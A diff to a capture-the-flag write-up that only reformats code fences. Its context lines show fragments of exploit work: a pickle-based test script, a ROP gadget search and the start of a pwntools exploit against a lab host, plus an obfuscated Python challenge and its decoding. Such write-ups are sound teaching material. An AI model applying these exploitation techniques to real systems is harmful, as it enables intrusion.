@@ -35,7 +35,8 @@ Due to the rush we were under, I didn't script up the entire payload delivery, b
 
 Here was the test:
 
-```import requests
+```
+import requests
 import cPickle
 import subprocess
 import os
@@ -72,14 +73,16 @@ Our method was to call `read()` again on the section of memory called `gadgets` 
 
 The only thing we needed was a `pop rdx` gadget, which we were able to find using this:
 
-```gdb-peda$ ropsearch "pop rdx" 
+```
+gdb-peda$ ropsearch "pop rdx" 
 Searching for ROP gadget: 'pop rdx' in: binary ranges
 0x0060118f : (b'5ac3')    pop rdx; ret
 ```
 
 our final exploit is below:
 
-```from pwn import *
+```
+from pwn import *
 
 #p = process(['./babys_first_rop'])
 p = remote('172.31.2.62', 47802)
@@ -164,7 +167,8 @@ This challenge was just an obfuscated python script with a cryptic hint: `we fou
 
 This is the original script:
 
-```a=b'\x62\x71\x65\x64\x65\x66\x67\x68\x6b\x71\x65\x64\x66\x67\x68\x71\x65\x64\x6d\x70\x70\x6d\x6a\x6b\x6e\x70\x6b\x61\x64\x73\x66\x61\x73\x64\x66\x61\x73\x64\x66\x6b\x61\x73\x7a'.decode()
+```
+a=b'\x62\x71\x65\x64\x65\x66\x67\x68\x6b\x71\x65\x64\x66\x67\x68\x71\x65\x64\x6d\x70\x70\x6d\x6a\x6b\x6e\x70\x6b\x61\x64\x73\x66\x61\x73\x64\x66\x61\x73\x64\x66\x6b\x61\x73\x7a'.decode()
 b=( 0.8571428571428571, 0.4424778761061947, 0.7326732673267327, 1.09, 0.9900990099009901, 0.8627450980392157, 0.7572815533980582, 1.0192307692307692, 0.8317757009345794, 0.7787610619469026, 0.8118811881188119, 1.12, 0.7549019607843137, 0.6893203883495146, 0.5096153846153846, 0.7522123893805309, 0.9801980198019802, 1.09, 0.6422018348623854, 1.0, 0.875, 1.0, 1.0188679245283019, 1.0934579439252337, 0.8181818181818182, 0.4375, 0.9345794392523364, 1.1443298969072164, 0.9, 0.7565217391304347, 0.8431372549019608, 1.1855670103092784, 0.8608695652173913, 1.19, 0.5980392156862745, 0.6288659793814433 )
 i=ord('e');i=__import__(chr(i+((2++++(++-+(++2+1+4)-2++++++++++++(++-+2)++++++++++++++++++++++++++++++++++++1+++++++++++1+++++++++++++++++++++++++++++11++++++++++++++11+1+1+++1+-+0xf-++++-+1+-+-++++-++1++-+-++++-1++-+-++++-1++-+-++++-1+-+-+-+-+-+(1+1+1+1)--+-+-+-+-+-++++-+1-++-+-+-+-1+11+1+-0xb+1+1+1+1)+8+1++1++++1)+++++++++-----++++++++--+--++++1+++++++++1++1))+chr(i)); x=lambda x,e: filter(x.match, zip(sorted(e.__dir__()), range(len(e.__dir__()))));
 z=34;c=0x10;d=196;e=258;f=119;n=19;h=24;d=32;e=39;r=14;s=10;q=15;e=lambda e,f:e.__class__.__getattribute__(e,sorted(e.__class__.__dir__(e))[f]);h=lambda c:c.__dir__.__self__.__class__.__getattribute__(c,sorted(c.__class__.__dir__(c))[0xa])
@@ -173,7 +177,8 @@ print(e(__import__(b'\x62\x61\x73\x65\x36\x34'.decode()),z)(globals()['__name__'
 
 After simplifying the script, we came up with this:
 
-```from base64 import b64encode
+```
+from base64 import b64encode
 
 def foo(a,b):
     return chr(int(float(ord(a))/b)%128)
@@ -186,7 +191,8 @@ if __name__ == '__main__':
 
 Using the `divided we fall` hint, we just changed it from division to multiplication and replaced the `b64encode` with `b64decode` which yielded this:
 
-```from base64 import b64encode, b64decode
+```
+from base64 import b64encode, b64decode
 
 def foo(a,b):
     return chr(int(float(ord(a))*b)%128)
